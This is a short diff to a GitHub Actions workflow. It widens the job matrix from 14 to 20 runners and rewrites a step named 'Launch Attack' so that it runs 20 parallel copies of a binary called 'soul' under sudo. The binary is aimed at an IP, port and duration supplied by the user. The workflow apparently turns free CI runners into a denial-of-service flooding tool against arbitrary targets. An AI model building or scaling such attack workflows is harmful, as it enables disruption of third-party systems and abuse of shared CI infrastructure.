@@ -17,7 +17,7 @@ jobs:
     runs-on: ubuntu-latest
     strategy:
       matrix:
-        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14]
+        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
     steps:
     - uses: actions/checkout@v4
       with:
@@ -27,7 +27,4 @@ jobs:
     - name: Launch Attack
       run: |
         chmod +x soul
-        for i in {1..10}; do
-          sudo ./soul ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} 999 &
-        done
-        wait
+        seq 1 20 | xargs -P 20 -I {} sudo ./soul ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} 999
